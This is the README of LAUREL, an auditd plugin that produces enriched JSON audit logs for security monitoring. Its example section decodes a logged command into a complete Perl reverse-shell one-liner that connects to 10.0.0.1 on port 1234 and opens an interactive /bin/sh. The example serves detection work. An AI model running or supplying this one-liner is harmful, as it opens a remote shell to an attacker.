![logo](laurel.svg)
# Linux Audit – Usable, Robust, Easy Logging

[![Build Status](https://github.com/threathunters-io/laurel/actions/workflows/build.yml/badge.svg)](https://github.com/threathunters-io/laurel/actions/workflows/build.yml)

LAUREL is an event post-processing plugin for _auditd(8)_ that generates useful, enriched JSON-based audit logs suitable for modern security monitoring setups.

Documentation corresponding to the latest stable release can be found [here](https://github.com/threathunters-io/laurel/tree/v0.7.0).

## Why?

TLDR: Instead of audit events that look like this…
```
type=EXECVE msg=audit(1626611363.720:348501): argc=3 a0="perl" a1="-e" a2=75736520536F636B65743B24693D2231302E302E302E31223B24703D313233343B736F636B65742…
```
…_LAUREL_ turns them into JSON logs where the mess that attackers/penetration testers/red teamers are trying to make becomes apparent at first glance:
```
{ … "EXECVE":{ "argc": 3,"ARGV": ["perl", "-e", "use Socket;$i=\"10.0.0.1\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};"]}, …}
```
This happens at the source because _LAUREL_ runs on the host where the audit events are generated. Events are enriched with useful information about the parent process (ppid):
```
"PPID":{"EVENT_ID":"1643635026.276:327308","comm":"sh","exe":"/usr/bin/dash","ppid":3190631}
```

## Documentation

Configuration and operational details are described in the [laurel(8)](man/laurel.8.md) manual page.
Details about the log format and rationales can be found in the [laurel-about(7)](man/laurel-about.7.md) manual page. The [laurel-audit-rules(7)](man/laurel-audit-rules.7.md) page contains advice and examples for configuring audit rules useful for detecting attackers' tactics.

The [_LAUREL_ installation instructions](INSTALL.md) contain instructions on how to build _LAUREL_ from source and how to install and configure it.

We developed _LAUREL_ because we were not content with feature sets and performance characteristics of existing projects and products. Please refer to the [Performance](performance.md) document for details.

## See also

- [ansible-auditd-laurel](https://github.com/certeu/ansible-auditd-laurel/), an Ansible role to deploy _auditd_ + _laurel_, by @0xFustang / CERT-EU

## License

GNU General Public License, version 3

## Authors

- Hilko Bengen <<bengen@hilluzination.de>>
- Sergej Schmidt <<sergej@msgpeek.net>>

The logo was created by Birgit Meyer <<hello@biggi.io>>.
